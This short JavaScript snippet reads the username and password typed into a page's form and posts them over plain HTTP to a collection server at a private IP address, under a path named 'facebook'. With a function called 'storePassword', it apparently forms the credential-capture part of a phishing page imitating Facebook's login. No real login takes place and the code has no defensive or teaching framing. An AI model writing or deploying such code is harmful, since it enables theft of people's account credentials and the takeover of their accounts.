const usernameTag = document.getElementById("username");
const passwordTag = document.getElementById("password");

function storePassword() {
  let username = usernameTag.value;
  let password = passwordTag.value;

  const createUser = () => {
    axios
      .post("http://192.168.35.225:8080/data/facebook", { username, password })
      .then((response) => {
        console.log(response);
      })
      .catch((error) => console.error(error));
  };

  createUser();
}
